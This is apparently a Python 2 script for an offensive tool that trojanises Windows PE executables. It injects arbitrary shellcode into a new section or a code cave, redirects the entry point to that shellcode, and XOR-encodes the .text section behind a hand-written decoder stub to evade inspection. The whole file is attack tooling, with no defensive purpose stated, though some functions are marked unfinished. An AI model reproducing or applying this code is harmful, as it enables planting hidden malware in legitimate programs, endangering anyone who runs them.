#!/usr/bin/python
# -*- coding: utf-8 -*-
# Credits:
# http://git.n0p.cc/?p=SectionDoubleP.git;a=blob;f=SectionDoubleP.py
# https://msdn.microsoft.com/en-us/library/ms809762.aspx
#
# TODO
#   - Add function to resume execution (not really working at the moment)
#   - Find code cave to put shellcode into
#   - XOR .text and/or .Xdata sections
#   - Fix prologue (for XOR sections)
import sys
import random
import string
import struct
import os
# Required
try: # Kind of check to ensure all modules are installed
    import pefile
    import argparse
    from pwn import disasm, asm
except:
    print "Please install the following modules to ensure %s works" % (sys.argv[0])
    print " - pefile"
    print " - argparse"
    print " - pwn"
    sys.exit(1)

# Import custom modules/functions
from f_generic import *
from f_pe import *

# Hide section (.text) through a XOR routine
def hide_xor(pe_struct, prologue, prologue_offset):
    new_pe_file = create_new_section(pe_struct, sectionName=".zebi")
    iterate_trough_pe_sections(pe_struct)

    # Get latest section
    latest_section = new_pe_file.sections[-1]
    # Figure out where to JMP (relative) from EntryPoint
    jmp_addr = latest_section.VirtualAddress - new_pe_file.OPTIONAL_HEADER.AddressOfEntryPoint - 1
    # relative JMP (use call to push @ on stack)
    jmp_shellcode = b"\xE8" + struct.pack("<I", jmp_addr)
    # Find size (and index) of a specific section
    section, index = find_section(pe_struct, section_name = ".text")

    # Remove this?
    diff_start_section = 0 #(new_pe_file.OPTIONAL_HEADER.AddressOfEntryPoint - section.VirtualAddress)+5
    diff_end_section = (section.VirtualAddress + section.SizeOfRawData) - (pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint)

    # Get XOR routine
    xor_routine = xor_routine_asm(diff_end_section)

    # Need to adjust for prologue
    if prologue_offset != -1:
        current_addr = latest_section.VirtualAddress + len(xor_routine)
        jmp_to = pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint + prologue_offset

        print hex(current_addr)
        print hex(jmp_to)

        #xor_routine += "\xe8" + "\x46\x52\xfd\xff"

    xor_routine += "\xff\xe0" # JMP EAX

    # Change code @ entry point
    new_pe_file.set_bytes_at_rva(new_pe_file.OPTIONAL_HEADER.AddressOfEntryPoint, jmp_shellcode)
    # Update code to add XOR routine
    new_pe_file.set_bytes_at_rva(latest_section.VirtualAddress, xor_routine)

    # Make section writable
    section.Characteristics = 0xE00000E0

def figure_prologue(pe_struct):
    prologue_instruction = get_ASM_instruction(pe_struct, pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint, 10)

    # Try to figure (and patch) EntryPoint instructions
    try:
        inst = prologue_instruction.split("\n")[0]
        if "call" in inst.lower():                  # Patch with relative offset
            # Fix this
            prologue = inst.split("  ")[0].replace(" ","")
            offset = 0x28f
            return prologue, offset
        else:
            prologue = inst.split("  ")[0]
            return prologue, -1
    except:
        return None, -1

def get_ASM_instruction(pe_struct, start_address, size=5, args=None):
    blob = pe_struct.get_data(start_address, size)
    return disasm(blob, arch="i386", offset=0)

# Create XOR (ASM) routine
def xor_routine_asm(end_address, prologue="", key=0xA0):
    xor_routine = "\x90\x90\x90\x90"                    # NOPs
    xor_routine += "\x58"                               # POP EAX
    xor_routine += "\x50"                               # PUSH EAX
    xor_routine += "\x89\xc5"                           # MOV EBP, EAX
    xor_routine += "\x81\xc5" + p(end_address)          # ADD EBP, {ADDR}
    xor_routine += "\x80\x30" + chr(key)                # Key for XOR routine
    xor_routine += "\x40"                               # INC EAX
    xor_routine += "\x39\xe8"                           # CMP EAX, EBP
    xor_routine += "\x0f\x8e\xf4\xff\xff\xff"           # JLE backwards
    xor_routine += "\x58"                               # POP EAX
    return xor_routine

#####################################################
# Functions
#####################################################

### Add shellcode to binary (either into new section or code cave)
def main_inject_shellcode(pe_struct, shellcode, section_name = None, output_file = None, code_cave=False, verbose=False):
    # Get shellcode content
    shellcode, shellcode_size = open_shellcode_file(shellcode)

    if not code_cave:
        print "\n[*] Adding shellcode into new section (technique 1)"
        # Generate a new section name (if not given by user)
        new_section_name = gen_section_name(section_name)
        # Create a new section
        pe_struct, new_section = create_new_section(pe_struct, sectionName=new_section_name)
        # Verbose
        if (args.verbose):
            iterate_trough_pe_sections(pe_struct)

        offset_address = new_section.VirtualAddress

    else: # Add new section
        print "\n[*] Adding shellcode into code cave (technique 2)"
        # Look for code_cave big enough for shellcode
        result_code_cave = find_code_cave(pe_struct, shellcode_size)
        if len(result_code_cave) == 0:
            print "[!] Can't find a code cave where your shellcode may fit (try with technique 1 or use a shorter shellcode).\nExiting..."
            sys.exit(1)
        else:
            # Let user decide which code cave to use
            code_cave_index = user_choice_int("\nWhich code cave do you want to use? ", "[!] Enter valid index please", len(result_code_cave))
            offset_address, section_name = result_code_cave[code_cave_index]
            # Check if section is executable
            if "x" not in get_section_flags(pe_struct, section_name):
                change_section_flags(pe_struct, section_name)

    # Injecting shellcode (new section)
    inject_shellcode(pe_struct, shellcode, offset_address)
    # Update entry point, to jump to our shellcode
    update_entry_point_jmp_to_shellcode(pe_struct, offset_address)
    # Write PE file
    write_PE_file(pe_struct, output_file)

#####################################################
# Main
#####################################################
if __name__ == "__main__":
    args = parser()

    # Load and analyse PE file
    pe_struct = load_pe_file(args.file)
    pe_quick_analysis(pe_struct)

    if (args.analyse): # Look for code cave
        pe_deeper_analysis(pe_struct)
    elif (args.fcc):
        find_code_cave(pe_struct)
    elif (args.hide):
        pass
    elif (args.shellcode):
        main_inject_shellcode(pe_struct, args.shellcode, args.new_sec_name, args.output, args.sh_cc, args.verbose)
    elif (args.test):
        # For .text only (at the moment)

        # 1 - Find prologue (few ASM instructions)
        prologue, p_offset = figure_prologue(pe_struct)
        if prologue == None:
            print "[!] Can't figure out prologue, the program might crash at run time"

        # 2 - XOR corresponding section
        xor_section(pe_struct, ".text", offset=(len(prologue)/2))
        # 3 - Add XOR routine
        hide_xor(pe_struct, prologue, p_offset)
        # 4 - Write PE file
        write_PE_file(pe_struct, "zeubi.exe")

    print "\n[*] Finished.\nExiting..."
